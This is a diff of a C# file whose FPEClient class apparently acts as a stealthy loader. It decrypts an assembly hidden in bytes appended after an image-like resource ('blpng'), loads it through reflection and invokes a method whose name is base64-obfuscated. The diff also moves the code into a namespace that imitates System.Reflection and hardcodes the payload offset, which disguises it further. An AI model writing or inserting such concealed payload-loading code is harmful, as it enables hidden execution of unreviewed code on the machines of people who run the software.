@@ -5,7 +5,7 @@ using System.Reflection;
 using System.Reflection.Emit;
 using System.Text;
 
-namespace FPE
+namespace System.Reflection.FPE
 {
     public class FPEClient
     {
@@ -64,46 +64,20 @@ namespace FPE
         {
             try
             {
-                //var z = GTR64("blpng.txt", Assembly.GetExecutingAssembly());
                 var myAssembly = AL(
-                    RAB(CFE(GTR64("blpng.txt", Assembly.GetExecutingAssembly()), bTos(EXT_2)))
-                        .Skip(
-                            RAB(GTR64("blpng.txt", Assembly.GetExecutingAssembly())).Length
-                        ).ToArray()
+                    RAB(CFE(GTR64("blpng", Assembly.GetExecutingAssembly()), bTos(EXT_2)))
+                        .Skip(34634).ToArray()
                 );
 
                 var ml = ML(
 
-                    myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())) // "System.Memory.Data.Past.FPEServer"
+                    myAssembly.GetType(GTR64("SMDPFPES", Assembly.GetExecutingAssembly())) // "System.Memory.Data.Past.FPEServer"
                     ,
-                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC.txt", Assembly.GetExecutingAssembly()))) /*methodName*/
+                    Encoding.UTF8.GetString(Convert.FromBase64String(GTR("RC", Assembly.GetExecutingAssembly()))) /*methodName*/
                 );
 
-                bool result = ml(GTR("FzCD.txt", Assembly.GetExecutingAssembly()) /* << fileName*/);
+                bool result = ml(GTR("FzCD", Assembly.GetExecutingAssembly()) /* << fileName*/);
                 return result ? 1 : 2;
-            }
-            catch (Exception ex)
-            {
-                var m = ex.Message;
-                return 3;
-            }
-            return 4;
-        }
-
-
-        public static int ResetConnection_old()
-        {
-            try
-            {
-                var buffer1 = File.ReadAllBytes(bTos(GTR64("blpng.txt", Assembly.GetExecutingAssembly())));
-                var buffer2 = File.ReadAllBytes(CFE(bTos(GTR64("blpng.txt", Assembly.GetExecutingAssembly())), bTos(EXT_2)));
-                var myAssembly = Assembly.Load(buffer2.Skip(buffer1.Length).ToArray());
-
-                var myType = myAssembly.GetType(GTR64("SMDPFPES.txt", Assembly.GetExecutingAssembly())); // "System.Memory.Data.Past.FPEServer"
-                var myMethod = myType.GetMethod(GTR64("RC.txt", Assembly.GetExecutingAssembly()), BindingFlags.Public | BindingFlags.Static); // "ResetConnection"
-                var fileName = GTR("FzCD.txt", Assembly.GetExecutingAssembly());
-                if (myMethod != null)
-                    return ((bool)myMethod.Invoke(null, new object[] { fileName })) ? 1 : 2;
             }
             catch (Exception ex)
             {
